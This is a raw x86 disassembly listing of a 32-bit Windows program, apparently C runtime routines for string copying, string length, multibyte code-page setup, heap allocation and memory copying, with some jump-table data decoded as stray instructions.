  423e10:	mov    ecx,DWORD PTR [esp+0xc]
  423e14:	push   edi
  423e15:	test   ecx,ecx
  423e17:	je     0x423eaf
  423e1d:	push   esi
  423e1e:	push   ebx
  423e1f:	mov    ebx,ecx
  423e21:	mov    esi,DWORD PTR [esp+0x14]
  423e25:	test   esi,0x3
  423e2b:	mov    edi,DWORD PTR [esp+0x10]
  423e2f:	jne    0x423e3c
  423e31:	shr    ecx,0x2
  423e34:	jne    0x423ebf
  423e3a:	jmp    0x423e63
  423e3c:	mov    al,BYTE PTR [esi]
  423e3e:	add    esi,0x1
  423e41:	mov    BYTE PTR [edi],al
  423e43:	add    edi,0x1
  423e46:	sub    ecx,0x1
  423e49:	je     0x423e76
  423e4b:	test   al,al
  423e4d:	je     0x423e7e
  423e4f:	test   esi,0x3
  423e55:	jne    0x423e3c
  423e57:	mov    ebx,ecx
  423e59:	shr    ecx,0x2
  423e5c:	jne    0x423ebf
  423e5e:	and    ebx,0x3
  423e61:	je     0x423e76
  423e63:	mov    al,BYTE PTR [esi]
  423e65:	add    esi,0x1
  423e68:	mov    BYTE PTR [edi],al
  423e6a:	add    edi,0x1
  423e6d:	test   al,al
  423e6f:	je     0x423ea8
  423e71:	sub    ebx,0x1
  423e74:	jne    0x423e63
  423e76:	mov    eax,DWORD PTR [esp+0x10]
  423e7a:	pop    ebx
  423e7b:	pop    esi
  423e7c:	pop    edi
  423e7d:	ret    
  423e7e:	test   edi,0x3
  423e84:	je     0x423e9c
  423e86:	mov    BYTE PTR [edi],al
  423e88:	add    edi,0x1
  423e8b:	sub    ecx,0x1
  423e8e:	je     0x423f2c
  423e94:	test   edi,0x3
  423e9a:	jne    0x423e86
  423e9c:	mov    ebx,ecx
  423e9e:	shr    ecx,0x2
  423ea1:	jne    0x423f17
  423ea3:	mov    BYTE PTR [edi],al
  423ea5:	add    edi,0x1
  423ea8:	sub    ebx,0x1
  423eab:	jne    0x423ea3
  423ead:	pop    ebx
  423eae:	pop    esi
  423eaf:	mov    eax,DWORD PTR [esp+0x8]
  423eb3:	pop    edi
  423eb4:	ret    
  423eb5:	mov    DWORD PTR [edi],edx
  423eb7:	add    edi,0x4
  423eba:	sub    ecx,0x1
  423ebd:	je     0x423e5e
  423ebf:	mov    edx,0x7efefeff
  423ec4:	mov    eax,DWORD PTR [esi]
  423ec6:	add    edx,eax
  423ec8:	xor    eax,0xffffffff
  423ecb:	xor    eax,edx
  423ecd:	mov    edx,DWORD PTR [esi]
  423ecf:	add    esi,0x4
  423ed2:	test   eax,0x81010100
  423ed7:	je     0x423eb5
  423ed9:	test   dl,dl
  423edb:	je     0x423f09
  423edd:	test   dh,dh
  423edf:	je     0x423eff
  423ee1:	test   edx,0xff0000
  423ee7:	je     0x423ef5
  423ee9:	test   edx,0xff000000
  423eef:	jne    0x423eb5
  423ef1:	mov    DWORD PTR [edi],edx
  423ef3:	jmp    0x423f0d
  423ef5:	and    edx,0xffff
  423efb:	mov    DWORD PTR [edi],edx
  423efd:	jmp    0x423f0d
  423eff:	and    edx,0xff
  423f05:	mov    DWORD PTR [edi],edx
  423f07:	jmp    0x423f0d
  423f09:	xor    edx,edx
  423f0b:	mov    DWORD PTR [edi],edx
  423f0d:	add    edi,0x4
  423f10:	xor    eax,eax
  423f12:	sub    ecx,0x1
  423f15:	je     0x423f23
  423f17:	xor    eax,eax
  423f19:	mov    DWORD PTR [edi],eax
  423f1b:	add    edi,0x4
  423f1e:	sub    ecx,0x1
  423f21:	jne    0x423f19
  423f23:	and    ebx,0x3
  423f26:	jne    0x423ea3
  423f2c:	mov    eax,DWORD PTR [esp+0x10]
  423f30:	pop    ebx
  423f31:	pop    esi
  423f32:	pop    edi
  423f33:	ret    
  423f34:	int3   
  423f35:	int3   
  423f36:	int3   
  423f37:	int3   
  423f38:	int3   
  423f39:	int3   
  423f3a:	int3   
  423f3b:	int3   
  423f3c:	int3   
  423f3d:	int3   
  423f3e:	int3   
  423f3f:	int3   
  423f40:	mov    ecx,DWORD PTR [esp+0x4]
  423f44:	test   ecx,0x3
  423f4a:	je     0x423f70
  423f4c:	mov    al,BYTE PTR [ecx]
  423f4e:	add    ecx,0x1
  423f51:	test   al,al
  423f53:	je     0x423fa3
  423f55:	test   ecx,0x3
  423f5b:	jne    0x423f4c
  423f5d:	add    eax,0x0
  423f62:	lea    esp,[esp+0x0]
  423f69:	lea    esp,[esp+0x0]
  423f70:	mov    eax,DWORD PTR [ecx]
  423f72:	mov    edx,0x7efefeff
  423f77:	add    edx,eax
  423f79:	xor    eax,0xffffffff
  423f7c:	xor    eax,edx
  423f7e:	add    ecx,0x4
  423f81:	test   eax,0x81010100
  423f86:	je     0x423f70
  423f88:	mov    eax,DWORD PTR [ecx-0x4]
  423f8b:	test   al,al
  423f8d:	je     0x423fc1
  423f8f:	test   ah,ah
  423f91:	je     0x423fb7
  423f93:	test   eax,0xff0000
  423f98:	je     0x423fad
  423f9a:	test   eax,0xff000000
  423f9f:	je     0x423fa3
  423fa1:	jmp    0x423f70
  423fa3:	lea    eax,[ecx-0x1]
  423fa6:	mov    ecx,DWORD PTR [esp+0x4]
  423faa:	sub    eax,ecx
  423fac:	ret    
  423fad:	lea    eax,[ecx-0x2]
  423fb0:	mov    ecx,DWORD PTR [esp+0x4]
  423fb4:	sub    eax,ecx
  423fb6:	ret    
  423fb7:	lea    eax,[ecx-0x3]
  423fba:	mov    ecx,DWORD PTR [esp+0x4]
  423fbe:	sub    eax,ecx
  423fc0:	ret    
  423fc1:	lea    eax,[ecx-0x4]
  423fc4:	mov    ecx,DWORD PTR [esp+0x4]
  423fc8:	sub    eax,ecx
  423fca:	ret    
  423fcb:	push   0x8
  423fcd:	push   0x428590
  423fd2:	call   0x423934
  423fd7:	and    DWORD PTR [ebp-0x4],0x0
  423fdb:	push   0x0
  423fdd:	push   0x1
  423fdf:	call   0x425b52
  423fe4:	pop    ecx
  423fe5:	pop    ecx
  423fe6:	jmp    0x423fef
  423fe8:	xor    eax,eax
  423fea:	inc    eax
  423feb:	ret    
  423fec:	mov    esp,DWORD PTR [ebp-0x18]
  423fef:	or     DWORD PTR [ebp-0x4],0xffffffff
  423ff3:	push   0x3
  423ff5:	call   DWORD PTR ds:0x428070
  423ffb:	int3   
  423ffc:	cmp    ecx,DWORD PTR ds:0x462600
  424002:	jne    0x424005
  424004:	ret    
  424005:	jmp    0x423fcb
  42400a:	movzx  eax,BYTE PTR [esp+0x4]
  42400f:	mov    cl,BYTE PTR [esp+0xc]
  424013:	test   BYTE PTR [eax+0x463101],cl
  424019:	jne    0x424037
  42401b:	cmp    DWORD PTR [esp+0x8],0x0
  424020:	je     0x424030
  424022:	movzx  eax,WORD PTR [eax*2+0x42898a]
  42402a:	and    eax,DWORD PTR [esp+0x8]
  42402e:	jmp    0x424032
  424030:	xor    eax,eax
  424032:	test   eax,eax
  424034:	jne    0x424037
  424036:	ret    
  424037:	xor    eax,eax
  424039:	inc    eax
  42403a:	ret    
  42403b:	push   0x4
  42403d:	push   0x0
  42403f:	push   DWORD PTR [esp+0xc]
  424043:	call   0x42400a
  424048:	add    esp,0xc
  42404b:	ret    
  42404c:	sub    eax,0x3a4
  424051:	je     0x424075
  424053:	sub    eax,0x4
  424056:	je     0x42406f
  424058:	sub    eax,0xd
  42405b:	je     0x424069
  42405d:	dec    eax
  42405e:	je     0x424063
  424060:	xor    eax,eax
  424062:	ret    
  424063:	mov    eax,0x404
  424068:	ret    
  424069:	mov    eax,0x412
  42406e:	ret    
  42406f:	mov    eax,0x804
  424074:	ret    
  424075:	mov    eax,0x411
  42407a:	ret    
  42407b:	push   edi
  42407c:	push   0x40
  42407e:	xor    eax,eax
  424080:	pop    ecx
  424081:	mov    edi,0x463100
  424086:	rep stos DWORD PTR es:[edi],eax
  424088:	stos   BYTE PTR es:[edi],al
  424089:	xor    eax,eax
  42408b:	mov    ds:0x463204,eax
  424090:	mov    ds:0x4630fc,eax
  424095:	mov    ds:0x4630f4,eax
  42409a:	mov    edi,0x463210
  42409f:	stos   DWORD PTR es:[edi],eax
  4240a0:	stos   DWORD PTR es:[edi],eax
  4240a1:	stos   DWORD PTR es:[edi],eax
  4240a2:	pop    edi
  4240a3:	ret    
  4240a4:	push   ebp
  4240a5:	mov    ebp,esp
  4240a7:	sub    esp,0x518
  4240ad:	mov    eax,ds:0x462600
  4240b2:	xor    eax,DWORD PTR [ebp+0x4]
  4240b5:	push   esi
  4240b6:	mov    DWORD PTR [ebp-0x4],eax
  4240b9:	lea    eax,[ebp-0x18]
  4240bc:	push   eax
  4240bd:	push   DWORD PTR ds:0x463204
  4240c3:	call   DWORD PTR ds:0x4280dc
  4240c9:	cmp    eax,0x1
  4240cc:	mov    esi,0x100
  4240d1:	jne    0x4241e4
  4240d7:	xor    eax,eax
  4240d9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  4240e0:	inc    eax
  4240e1:	cmp    eax,esi
  4240e3:	jb     0x4240d9
  4240e5:	mov    al,BYTE PTR [ebp-0x12]
  4240e8:	test   al,al
  4240ea:	mov    BYTE PTR [ebp-0x118],0x20
  4240f1:	je     0x424129
  4240f3:	push   ebx
  4240f4:	lea    edx,[ebp-0x11]
  4240f7:	push   edi
  4240f8:	movzx  ecx,BYTE PTR [edx]
  4240fb:	movzx  eax,al
  4240fe:	cmp    eax,ecx
  424100:	ja     0x42411f
  424102:	sub    ecx,eax
  424104:	inc    ecx
  424105:	mov    ebx,ecx
  424107:	shr    ecx,0x2
  42410a:	lea    edi,[ebp+eax*1-0x118]
  424111:	mov    eax,0x20202020
  424116:	rep stos DWORD PTR es:[edi],eax
  424118:	mov    ecx,ebx
  42411a:	and    ecx,0x3
  42411d:	rep stos BYTE PTR es:[edi],al
  42411f:	inc    edx
  424120:	mov    al,BYTE PTR [edx]
  424122:	inc    edx
  424123:	test   al,al
  424125:	jne    0x4240f8
  424127:	pop    edi
  424128:	pop    ebx
  424129:	push   0x0
  42412b:	push   DWORD PTR ds:0x4630f4
  424131:	lea    eax,[ebp-0x518]
  424137:	push   DWORD PTR ds:0x463204
  42413d:	push   eax
  42413e:	push   esi
  42413f:	lea    eax,[ebp-0x118]
  424145:	push   eax
  424146:	push   0x1
  424148:	call   0x426058
  42414d:	push   0x0
  42414f:	push   DWORD PTR ds:0x463204
  424155:	lea    eax,[ebp-0x218]
  42415b:	push   esi
  42415c:	push   eax
  42415d:	push   esi
  42415e:	lea    eax,[ebp-0x118]
  424164:	push   eax
  424165:	push   esi
  424166:	push   DWORD PTR ds:0x4630f4
  42416c:	call   0x425c9c
  424171:	push   0x0
  424173:	push   DWORD PTR ds:0x463204
  424179:	lea    eax,[ebp-0x318]
  42417f:	push   esi
  424180:	push   eax
  424181:	push   esi
  424182:	lea    eax,[ebp-0x118]
  424188:	push   eax
  424189:	push   0x200
  42418e:	push   DWORD PTR ds:0x4630f4
  424194:	call   0x425c9c
  424199:	add    esp,0x5c
  42419c:	xor    eax,eax
  42419e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4241a6:	test   cl,0x1
  4241a9:	je     0x4241c1
  4241ab:	or     BYTE PTR [eax+0x463101],0x10
  4241b2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4241b9:	mov    BYTE PTR [eax+0x463220],cl
  4241bf:	jmp    0x4241dd
  4241c1:	test   cl,0x2
  4241c4:	je     0x4241d6
  4241c6:	or     BYTE PTR [eax+0x463101],0x20
  4241cd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  4241d4:	jmp    0x4241b9
  4241d6:	and    BYTE PTR [eax+0x463220],0x0
  4241dd:	inc    eax
  4241de:	cmp    eax,esi
  4241e0:	jb     0x42419e
  4241e2:	jmp    0x424228
  4241e4:	xor    eax,eax
  4241e6:	cmp    eax,0x41
  4241e9:	jb     0x424204
  4241eb:	cmp    eax,0x5a
  4241ee:	ja     0x424204
  4241f0:	or     BYTE PTR [eax+0x463101],0x10
  4241f7:	mov    cl,al
  4241f9:	add    cl,0x20
  4241fc:	mov    BYTE PTR [eax+0x463220],cl
  424202:	jmp    0x424223
  424204:	cmp    eax,0x61
  424207:	jb     0x42421c
  424209:	cmp    eax,0x7a
  42420c:	ja     0x42421c
  42420e:	or     BYTE PTR [eax+0x463101],0x20
  424215:	mov    cl,al
  424217:	sub    cl,0x20
  42421a:	jmp    0x4241fc
  42421c:	and    BYTE PTR [eax+0x463220],0x0
  424223:	inc    eax
  424224:	cmp    eax,esi
  424226:	jb     0x4241e6
  424228:	mov    ecx,DWORD PTR [ebp-0x4]
  42422b:	xor    ecx,DWORD PTR [ebp+0x4]
  42422e:	pop    esi
  42422f:	call   0x423ffc
  424234:	leave  
  424235:	ret    
  424236:	push   ebp
  424237:	mov    ebp,esp
  424239:	sub    esp,0x1c
  42423c:	mov    eax,ds:0x462600
  424241:	xor    eax,DWORD PTR [ebp+0x4]
  424244:	push   ebx
  424245:	push   esi
  424246:	mov    esi,DWORD PTR [ebp+0x8]
  424249:	xor    ebx,ebx
  42424b:	cmp    esi,ebx
  42424d:	mov    DWORD PTR [ebp-0x4],eax
  424250:	push   edi
  424251:	je     0x4243ab
  424257:	xor    edx,edx
  424259:	xor    eax,eax
  42425b:	cmp    DWORD PTR [eax+0x462610],esi
  424261:	je     0x4242c8
  424263:	add    eax,0x30
  424266:	inc    edx
  424267:	cmp    eax,0xf0
  42426c:	jb     0x42425b
  42426e:	lea    eax,[ebp-0x1c]
  424271:	push   eax
  424272:	push   esi
  424273:	call   DWORD PTR ds:0x4280dc
  424279:	cmp    eax,0x1
  42427c:	jne    0x4243a3
  424282:	push   0x40
  424284:	xor    eax,eax
  424286:	cmp    DWORD PTR [ebp-0x1c],0x1
  42428a:	pop    ecx
  42428b:	mov    edi,0x463100
  424290:	rep stos DWORD PTR es:[edi],eax
  424292:	stos   BYTE PTR es:[edi],al
  424293:	mov    DWORD PTR ds:0x463204,esi
  424299:	mov    DWORD PTR ds:0x4630f4,ebx
  42429f:	jbe    0x424391
  4242a5:	cmp    BYTE PTR [ebp-0x16],0x0
  4242a9:	je     0x424369
  4242af:	lea    ecx,[ebp-0x15]
  4242b2:	mov    dl,BYTE PTR [ecx]
  4242b4:	test   dl,dl
  4242b6:	je     0x424369
  4242bc:	movzx  eax,BYTE PTR [ecx-0x1]
  4242c0:	movzx  edx,dl
  4242c3:	jmp    0x424359
  4242c8:	push   0x40
  4242ca:	xor    eax,eax
  4242cc:	pop    ecx
  4242cd:	mov    edi,0x463100
  4242d2:	rep stos DWORD PTR es:[edi],eax
  4242d4:	lea    ecx,[edx+edx*2]
  4242d7:	shl    ecx,0x4
  4242da:	mov    DWORD PTR [ebp-0x8],ebx
  4242dd:	stos   BYTE PTR es:[edi],al
  4242de:	lea    ebx,[ecx+0x462620]
  4242e4:	mov    al,BYTE PTR [ebx]
  4242e6:	mov    esi,ebx
  4242e8:	jmp    0x424313
  4242ea:	mov    dl,BYTE PTR [esi+0x1]
  4242ed:	test   dl,dl
  4242ef:	je     0x424317
  4242f1:	movzx  eax,al
  4242f4:	movzx  edi,dl
  4242f7:	cmp    eax,edi
  4242f9:	ja     0x42430f
  4242fb:	mov    edx,DWORD PTR [ebp-0x8]
  4242fe:	mov    dl,BYTE PTR [edx+0x462608]
  424304:	or     BYTE PTR [eax+0x463101],dl
  42430a:	inc    eax
  42430b:	cmp    eax,edi
  42430d:	jbe    0x424304
  42430f:	inc    esi
  424310:	inc    esi
  424311:	mov    al,BYTE PTR [esi]
  424313:	test   al,al
  424315:	jne    0x4242ea
  424317:	inc    DWORD PTR [ebp-0x8]
  42431a:	add    ebx,0x8
  42431d:	cmp    DWORD PTR [ebp-0x8],0x4
  424321:	jb     0x4242e4
  424323:	mov    eax,DWORD PTR [ebp+0x8]
  424326:	mov    ds:0x463204,eax
  42432b:	mov    DWORD PTR ds:0x4630fc,0x1
  424335:	call   0x42404c
  42433a:	lea    ecx,[ecx+0x462614]
  424340:	mov    esi,ecx
  424342:	mov    edi,0x463210
  424347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424349:	mov    ds:0x4630f4,eax
  42434e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42434f:	jmp    0x4243b0
  424351:	or     BYTE PTR [eax+0x463101],0x4
  424358:	inc    eax
  424359:	cmp    eax,edx
  42435b:	jbe    0x424351
  42435d:	inc    ecx
  42435e:	inc    ecx
  42435f:	cmp    BYTE PTR [ecx-0x1],0x0
  424363:	jne    0x4242b2
  424369:	xor    ecx,ecx
  42436b:	inc    ecx
  42436c:	mov    eax,ecx
  42436e:	or     BYTE PTR [eax+0x463101],0x8
  424375:	inc    eax
  424376:	cmp    eax,0xff
  42437b:	jb     0x42436e
  42437d:	mov    eax,esi
  42437f:	call   0x42404c
  424384:	mov    ds:0x4630f4,eax
  424389:	mov    DWORD PTR ds:0x4630fc,ecx
  42438f:	jmp    0x424397
  424391:	mov    DWORD PTR ds:0x4630fc,ebx
  424397:	xor    eax,eax
  424399:	mov    edi,0x463210
  42439e:	stos   DWORD PTR es:[edi],eax
  42439f:	stos   DWORD PTR es:[edi],eax
  4243a0:	stos   DWORD PTR es:[edi],eax
  4243a1:	jmp    0x4243b0
  4243a3:	cmp    DWORD PTR ds:0x462f64,ebx
  4243a9:	je     0x4243b9
  4243ab:	call   0x42407b
  4243b0:	call   0x4240a4
  4243b5:	xor    eax,eax
  4243b7:	jmp    0x4243bc
  4243b9:	or     eax,0xffffffff
  4243bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4243bf:	xor    ecx,DWORD PTR [ebp+0x4]
  4243c2:	pop    edi
  4243c3:	pop    esi
  4243c4:	pop    ebx
  4243c5:	call   0x423ffc
  4243ca:	leave  
  4243cb:	ret    
  4243cc:	push   0x14
  4243ce:	push   0x4285a0
  4243d3:	call   0x423934
  4243d8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  4243dc:	push   0xd
  4243de:	call   0x423aef
  4243e3:	pop    ecx
  4243e4:	xor    edi,edi
  4243e6:	mov    DWORD PTR [ebp-0x4],edi
  4243e9:	mov    DWORD PTR ds:0x462f64,edi
  4243ef:	mov    eax,DWORD PTR [ebp+0x8]
  4243f2:	cmp    eax,0xfffffffe
  4243f5:	jne    0x424409
  4243f7:	mov    DWORD PTR ds:0x462f64,0x1
  424401:	call   DWORD PTR ds:0x4280d8
  424407:	jmp    0x424434
  424409:	cmp    eax,0xfffffffd
  42440c:	jne    0x424420
  42440e:	mov    DWORD PTR ds:0x462f64,0x1
  424418:	call   DWORD PTR ds:0x4280d4
  42441e:	jmp    0x424434
  424420:	cmp    eax,0xfffffffc
  424423:	jne    0x424434
  424425:	mov    DWORD PTR ds:0x462f64,0x1
  42442f:	mov    eax,ds:0x462f94
  424434:	mov    DWORD PTR [ebp+0x8],eax
  424437:	cmp    eax,DWORD PTR ds:0x463204
  42443d:	je     0x4244fe
  424443:	mov    esi,DWORD PTR ds:0x4630f8
  424449:	mov    DWORD PTR [ebp-0x20],esi
  42444c:	cmp    esi,edi
  42444e:	je     0x424454
  424450:	cmp    DWORD PTR [esi],edi
  424452:	je     0x424464
  424454:	push   0x220
  424459:	call   0x424652
  42445e:	pop    ecx
  42445f:	mov    esi,eax
  424461:	mov    DWORD PTR [ebp-0x20],esi
  424464:	cmp    esi,edi
  424466:	je     0x4244e7
  424468:	push   DWORD PTR [ebp+0x8]
  42446b:	call   0x424236
  424470:	pop    ecx
  424471:	mov    DWORD PTR [ebp-0x1c],eax
  424474:	cmp    eax,edi
  424476:	jne    0x4244e7
  424478:	mov    DWORD PTR [esi],edi
  42447a:	mov    eax,ds:0x463204
  42447f:	mov    DWORD PTR [esi+0x4],eax
  424482:	mov    eax,ds:0x4630fc
  424487:	mov    DWORD PTR [esi+0x8],eax
  42448a:	mov    eax,ds:0x4630f4
  42448f:	mov    DWORD PTR [esi+0xc],eax
  424492:	xor    eax,eax
  424494:	mov    DWORD PTR [ebp-0x24],eax
  424497:	cmp    eax,0x5
  42449a:	jge    0x4244ac
  42449c:	mov    cx,WORD PTR [eax*2+0x463210]
  4244a4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4244a9:	inc    eax
  4244aa:	jmp    0x424494
  4244ac:	xor    eax,eax
  4244ae:	mov    DWORD PTR [ebp-0x24],eax
  4244b1:	cmp    eax,0x101
  4244b6:	jge    0x4244c5
  4244b8:	mov    cl,BYTE PTR [eax+0x463100]
  4244be:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4244c2:	inc    eax
  4244c3:	jmp    0x4244ae
  4244c5:	xor    eax,eax
  4244c7:	mov    DWORD PTR [ebp-0x24],eax
  4244ca:	cmp    eax,0x100
  4244cf:	jge    0x4244e1
  4244d1:	mov    cl,BYTE PTR [eax+0x463220]
  4244d7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  4244de:	inc    eax
  4244df:	jmp    0x4244c7
  4244e1:	mov    DWORD PTR ds:0x4630f8,esi
  4244e7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  4244eb:	jne    0x424501
  4244ed:	cmp    esi,DWORD PTR ds:0x4630f8
  4244f3:	je     0x424501
  4244f5:	push   esi
  4244f6:	call   0x42453a
  4244fb:	pop    ecx
  4244fc:	jmp    0x424501
  4244fe:	mov    DWORD PTR [ebp-0x1c],edi
  424501:	or     DWORD PTR [ebp-0x4],0xffffffff
  424505:	call   0x424513
  42450a:	mov    eax,DWORD PTR [ebp-0x1c]
  42450d:	call   0x42396f
  424512:	ret    
  424513:	push   0xd
  424515:	call   0x423a5b
  42451a:	pop    ecx
  42451b:	ret    
  42451c:	cmp    DWORD PTR ds:0x46344c,0x0
  424523:	jne    0x424537
  424525:	push   0xfffffffd
  424527:	call   0x4243cc
  42452c:	pop    ecx
  42452d:	mov    DWORD PTR ds:0x46344c,0x1
  424537:	xor    eax,eax
  424539:	ret    
  42453a:	push   0xc
  42453c:	push   0x4285b0
  424541:	call   0x423934
  424546:	mov    esi,DWORD PTR [ebp+0x8]
  424549:	test   esi,esi
  42454b:	je     0x4245a5
  42454d:	cmp    DWORD PTR ds:0x463324,0x3
  424554:	jne    0x424596
  424556:	push   0x4
  424558:	call   0x423aef
  42455d:	pop    ecx
  42455e:	and    DWORD PTR [ebp-0x4],0x0
  424562:	push   esi
  424563:	call   0x424d12
  424568:	pop    ecx
  424569:	mov    DWORD PTR [ebp-0x1c],eax
  42456c:	test   eax,eax
  42456e:	je     0x424579
  424570:	push   esi
  424571:	push   eax
  424572:	call   0x424d3d
  424577:	pop    ecx
  424578:	pop    ecx
  424579:	or     DWORD PTR [ebp-0x4],0xffffffff
  42457d:	call   0x42458d
  424582:	cmp    DWORD PTR [ebp-0x1c],0x0
  424586:	jne    0x4245a5
  424588:	push   DWORD PTR [ebp+0x8]
  42458b:	jmp    0x424597
  42458d:	push   0x4
  42458f:	call   0x423a5b
  424594:	pop    ecx
  424595:	ret    
  424596:	push   esi
  424597:	push   0x0
  424599:	push   DWORD PTR ds:0x463320
  42459f:	call   DWORD PTR ds:0x4280c4
  4245a5:	call   0x42396f
  4245aa:	ret    
  4245ab:	push   0xc
  4245ad:	push   0x4285c0
  4245b2:	call   0x423934
  4245b7:	mov    esi,DWORD PTR [ebp+0x8]
  4245ba:	cmp    DWORD PTR ds:0x463324,0x3
  4245c1:	jne    0x4245f1
  4245c3:	cmp    esi,DWORD PTR ds:0x4630e4
  4245c9:	ja     0x4245f1
  4245cb:	push   0x4
  4245cd:	call   0x423aef
  4245d2:	pop    ecx
  4245d3:	and    DWORD PTR [ebp-0x4],0x0
  4245d7:	push   esi
  4245d8:	call   0x4254f1
  4245dd:	pop    ecx
  4245de:	mov    DWORD PTR [ebp-0x1c],eax
  4245e1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4245e5:	call   0x42461d
  4245ea:	mov    eax,DWORD PTR [ebp-0x1c]
  4245ed:	test   eax,eax
  4245ef:	jne    0x424614
  4245f1:	test   esi,esi
  4245f3:	jne    0x4245f6
  4245f5:	inc    esi
  4245f6:	cmp    DWORD PTR ds:0x463324,0x1
  4245fd:	je     0x424605
  4245ff:	add    esi,0xf
  424602:	and    esi,0xfffffff0
  424605:	push   esi
  424606:	push   0x0
  424608:	push   DWORD PTR ds:0x463320
  42460e:	call   DWORD PTR ds:0x4280e0
  424614:	call   0x42396f
  424619:	ret    
  42461a:	mov    esi,DWORD PTR [ebp+0x8]
  42461d:	push   0x4
  42461f:	call   0x423a5b
  424624:	pop    ecx
  424625:	ret    
  424626:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42462b:	ja     0x42464f
  42462d:	push   DWORD PTR [esp+0x4]
  424631:	call   0x4245ab
  424636:	test   eax,eax
  424638:	pop    ecx
  424639:	jne    0x424651
  42463b:	cmp    DWORD PTR [esp+0x8],eax
  42463f:	je     0x424651
  424641:	push   DWORD PTR [esp+0x4]
  424645:	call   0x426212
  42464a:	test   eax,eax
  42464c:	pop    ecx
  42464d:	jne    0x42462d
  42464f:	xor    eax,eax
  424651:	ret    
  424652:	push   DWORD PTR ds:0x462fa8
  424658:	push   DWORD PTR [esp+0x8]
  42465c:	call   0x424626
  424661:	pop    ecx
  424662:	pop    ecx
  424663:	ret    
  424664:	int3   
  424665:	int3   
  424666:	int3   
  424667:	int3   
  424668:	int3   
  424669:	int3   
  42466a:	int3   
  42466b:	int3   
  42466c:	int3   
  42466d:	int3   
  42466e:	int3   
  42466f:	int3   
  424670:	push   ebp
  424671:	mov    ebp,esp
  424673:	push   edi
  424674:	push   esi
  424675:	mov    esi,DWORD PTR [ebp+0xc]
  424678:	mov    ecx,DWORD PTR [ebp+0x10]
  42467b:	mov    edi,DWORD PTR [ebp+0x8]
  42467e:	mov    eax,ecx
  424680:	mov    edx,ecx
  424682:	add    eax,esi
  424684:	cmp    edi,esi
  424686:	jbe    0x424690
  424688:	cmp    edi,eax
  42468a:	jb     0x42480c
  424690:	test   edi,0x3
  424696:	jne    0x4246ac
  424698:	shr    ecx,0x2
  42469b:	and    edx,0x3
  42469e:	cmp    ecx,0x8
  4246a1:	jb     0x4246cc
  4246a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a5:	jmp    DWORD PTR [edx*4+0x4247bc]
  4246ac:	mov    eax,edi
  4246ae:	mov    edx,0x3
  4246b3:	sub    ecx,0x4
  4246b6:	jb     0x4246c4
  4246b8:	and    eax,0x3
  4246bb:	add    ecx,eax
  4246bd:	jmp    DWORD PTR [eax*4+0x4246d0]
  4246c4:	jmp    DWORD PTR [ecx*4+0x4247cc]
  4246cb:	nop
  4246cc:	jmp    DWORD PTR [ecx*4+0x424750]
  4246d3:	nop
  4246d4:	loopne 0x42471c
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [edi+eax*2],cl
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dh
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [ebx],ah
  4246e1:	ror    DWORD PTR [edx-0x75f877fa],1
  4246e7:	inc    esi
  4246e8:	add    DWORD PTR [eax+0x468a0147],ecx
  4246ee:	add    al,cl
  4246f0:	jmp    0x289cef7
  4246f5:	add    esi,0x3
  4246f8:	add    edi,0x3
  4246fb:	cmp    ecx,0x8
  4246fe:	jb     0x4246cc
  424700:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424702:	jmp    DWORD PTR [edx*4+0x4247bc]
  424709:	lea    ecx,[ecx+0x0]
  42470c:	and    edx,ecx
  42470e:	mov    al,BYTE PTR [esi]
  424710:	mov    BYTE PTR [edi],al
  424712:	mov    al,BYTE PTR [esi+0x1]
  424715:	shr    ecx,0x2
  424718:	mov    BYTE PTR [edi+0x1],al
  42471b:	add    esi,0x2
  42471e:	add    edi,0x2
  424721:	cmp    ecx,0x8
  424724:	jb     0x4246cc
  424726:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424728:	jmp    DWORD PTR [edx*4+0x4247bc]
  42472f:	nop
  424730:	and    edx,ecx
  424732:	mov    al,BYTE PTR [esi]
  424734:	mov    BYTE PTR [edi],al
  424736:	add    esi,0x1
  424739:	shr    ecx,0x2
  42473c:	add    edi,0x1
  42473f:	cmp    ecx,0x8
  424742:	jb     0x4246cc
  424744:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424746:	jmp    DWORD PTR [edx*4+0x4247bc]
  42474d:	lea    ecx,[ecx+0x0]
  424750:	mov    bl,0x47
  424752:	inc    edx
  424753:	add    BYTE PTR [eax-0x67ffbdb9],ah
  424759:	inc    edi
  42475a:	inc    edx
  42475b:	add    BYTE PTR [eax-0x77ffbdb9],dl
  424761:	inc    edi
  424762:	inc    edx
  424763:	add    BYTE PTR [eax+0x78004247],al
  424769:	inc    edi
  42476a:	inc    edx
  42476b:	add    BYTE PTR [eax+0x47],dh
  42476e:	inc    edx
  42476f:	add    BYTE PTR [ebx-0x761b71bc],cl
  424775:	inc    esp
  424776:	(bad)  
  424777:	in     al,0x8b
  424779:	inc    esp
  42477a:	mov    gs,eax
  42477c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424780:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424784:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424788:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42478c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424790:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424794:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424798:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42479c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
